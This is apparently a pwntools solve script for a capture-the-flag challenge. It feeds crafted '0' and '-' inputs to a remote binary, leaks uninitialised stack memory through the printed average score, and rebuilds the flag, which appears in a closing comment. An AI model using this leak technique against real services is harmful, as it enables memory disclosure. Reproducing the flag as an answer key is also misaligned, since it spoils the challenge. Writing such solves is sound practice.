#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./chall_patched")

context.binary = exe

REMOTE_NC_CMD    = "nc 0.cloud.chals.io 10198"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *vuln+93
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    flag=b""
    conta=0

    while b"}" not in flag:
        r = conn()

        for i in range(4+conta):
            r.sendline(b"0")
        r.sendline(b"-")
        for i in range(15-conta):
            r.sendline(b"0")

        r.recvuntil(b"Average score is ")
        leak = int(float(r.recvline()[:-2])*20)
        flag+=p64(leak)

        print(flag.replace(b"\x00", b""))
        r.close()
        conta+=1

    print(flag.replace(b"\x00", b""))
    #TBTL{e4t_Y0ur_vegG13s_1n1714l1z3_y0ur_d4rn_v4r14bl35}

if __name__ == "__main__":
    main()